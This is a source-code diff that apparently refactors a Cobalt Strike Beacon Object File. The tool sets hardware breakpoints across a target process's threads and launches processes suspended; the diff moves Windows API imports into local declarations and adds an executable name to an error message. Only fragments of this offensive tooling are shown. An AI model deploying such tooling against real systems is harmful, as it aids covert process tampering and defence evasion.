@@ -22,7 +22,7 @@ extern "C" {
 #include <cstdint>
 #pragma comment(lib, "Dbghelp.lib")
 
-#pragma region DFR
+
     DFR(KERNEL32, GetLastError);
     #define GetLastError KERNEL32$GetLastError 
 
@@ -37,8 +37,6 @@ extern "C" {
 
     DFR(KERNEL32, OpenThread);
     #define OpenThread KERNEL32$OpenThread
-    DFR(KERNEL32, GetThreadId)
-    #define GetThreadId KERNEL32$GetThreadId
     DFR(KERNEL32, SuspendThread)
     #define SuspendThread KERNEL32$SuspendThread
     DFR(KERNEL32, ResumeThread);
@@ -67,10 +65,6 @@ extern "C" {
     #define Process32FirstW KERNEL32$Process32FirstW
     DFR(KERNEL32, Process32NextW)
     #define Process32NextW KERNEL32$Process32NextW
-    DFR(KERNEL32, Thread32First)
-    #define Thread32First KERNEL32$Thread32First
-    DFR(KERNEL32, Thread32Next)
-    #define Thread32Next KERNEL32$Thread32Next
 
     DFR(MSVCRT, _wcsicmp)
     #define _wcsicmp MSVCRT$_wcsicmp
@@ -92,7 +86,6 @@ extern "C" {
     //Due to wcscpy_s overloads, this won't work. In BOF we use memcpy instead
     //DFR(MSVCRT, wcscpy_s)
     //#define wcscpy_s MSVCRT$wcscpy_s
-#pragma endregion
 
 #pragma region HWBreakpoint
 
@@ -134,7 +127,8 @@ extern "C" {
     }
 
     BOOL SetHWBPOnThread(HANDLE hThread, uintptr_t bpAddress) {
-
+        DFR_LOCAL(KERNEL32, SuspendThread)
+        DFR_LOCAL(KERNEL32, GetThreadId)
         if (SuspendThread(hThread) == ((DWORD)-1)) {
             BeaconPrintf(CALLBACK_ERROR, "Failed to suspend Thread: %d, Error: %d\n", GetThreadId(hThread), GetLastError());
             return FALSE;
@@ -201,7 +195,8 @@ extern "C" {
     }
 
     BOOL SetOnAllThreadsTL32(DWORD pid, uintptr_t addr) {
-
+        DFR_LOCAL(KERNEL32, Thread32First);
+        DFR_LOCAL(KERNEL32, Thread32Next)
         HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
         if (snap == INVALID_HANDLE_VALUE) {
             BeaconPrintf(CALLBACK_ERROR, "CreateToolhelp32Snapshot failed, Error: %d\n", GetLastError());
@@ -804,7 +799,7 @@ extern "C" {
 
         // Start a new instance suspended
         if (!CreateProcessW(targetExecutable, nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
-            BeaconPrintf(CALLBACK_ERROR, "Failed to create process. Error: %d\n", GetLastError());
+            BeaconPrintf(CALLBACK_ERROR, "%s Failed to create process. Error: %d\n", targetExecutable, GetLastError());
             return;
         }
         BeaconPrintf(CALLBACK_OUTPUT, "Successfully created suspended process with PID: %d\n", pi.dwProcessId);
